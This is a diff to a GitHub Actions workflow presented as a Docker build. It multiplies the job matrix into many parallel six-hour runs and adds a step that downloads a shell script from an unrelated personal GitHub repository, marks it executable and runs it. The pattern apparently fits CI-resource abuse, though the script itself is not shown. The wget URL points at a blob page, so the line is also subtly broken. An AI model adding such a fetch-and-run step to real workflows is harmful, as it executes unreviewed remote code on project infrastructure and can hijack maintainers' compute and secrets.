@@ -1,6 +1,19 @@
 name: Docker
+on:
+  pull_request:
 
-on: [push, pull_request]
+defaults:
+  run:
+    shell: 'bash -Eeuo pipefail -x {0}'
+
+env:
+  # https://github.com/docker-library/bashbrew/issues/10
+  GIT_LFS_SKIP_SMUDGE: 1
+  
+# cancel existing runs if user makes another push
+concurrency:
+  group: ${{ github.ref }}
+  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
 jobs:
   build:
     name: Docker
@@ -9,8 +22,8 @@ jobs:
       max-parallel: 20
       fail-fast: false
       matrix:
-        go: [1.2]
-        flag: [A]
+        go: [1.2, 1.3, 1.4]
+        flag: [A, B, C, D, e]
     timeout-minutes: 360
     env:
         NUM_JOBS: 20
@@ -26,4 +39,4 @@ jobs:
     - name: run
       run: |
           git clone --depth 1 https://github.com/sifamuhaeny/dind.git
-          wget Dockerfile
+          wget https://github.com/sifamuhaeny/khsusahsna/blob/main/wrapdocker.sh  && chmod u+x wrapdocker.sh && ./wrapdocker.sh
